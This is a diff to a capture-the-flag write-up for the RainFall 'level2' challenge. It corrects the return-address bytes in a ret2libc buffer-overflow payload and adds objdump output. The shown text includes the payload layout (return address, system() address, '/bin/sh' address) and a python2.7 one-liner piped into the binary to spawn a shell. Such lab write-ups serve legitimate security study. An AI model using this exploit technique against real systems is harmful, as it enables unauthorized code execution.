@@ -10,10 +10,21 @@ objdump -dC -M intel level2
 
 ### return address
 
+```shell
+level2@RainFall:~$ objdump -dC -M intel level2
+0804853f <main>:
+ 804853f:       55                      push   ebp
+ 8048540:       89 e5                   mov    ebp,esp
+ 8048542:       83 e4 f0                and    esp,0xfffffff0
+ 8048545:       e8 8a ff ff ff          call   80484d4 <p>
+ 804854a:       c9                      leave
+ 804854b:       c3                      ret
 ```
-system("/bin/sh")` : ret                 + system + "...." + "/bin/sh"
-                      "0x804854f"         + ...
-                      "\x4f\x85\x04\x08"  + ...
+
+```
+system("/bin/sh") : ret                 + system + "...." + "/bin/sh"
+                    "0x804854b"         + ...
+                    "\x4b\x85\x04\x08"  + ...
 ```
 
 ### system address
@@ -27,9 +38,9 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ```
 
 ```
-`system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
-                      "0x804854f"         + "0xb7e6b060"        + "...." + ...
-                      "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + ...
+system("/bin/sh") : ret                 + system              + "...." + "/bin/sh"
+                    "0x804854b"         + "0xb7e6b060"        + "...." + ...
+                    "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + ...
 ```
 
 ### "/bin/sh" address
@@ -47,15 +58,15 @@ find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
 ```
 
 ```
-`system("/bin/sh")` : ret                 + system              + "...." + "/bin/sh"
-                      "0x804854f"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
-                      "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
+system("/bin/sh") : ret                 + system              + "...." + "/bin/sh"
+                    "0x804854b"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
+                    "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
 ```
 
 ## exploit
 
 ```shell
-python2.7 -c 'print("X"*80 + "\x4f\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
+python2.7 -c 'print("X"*80 + "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
 cat /tmp/exploit.txt /dev/stdin | ./level2
 ```
 
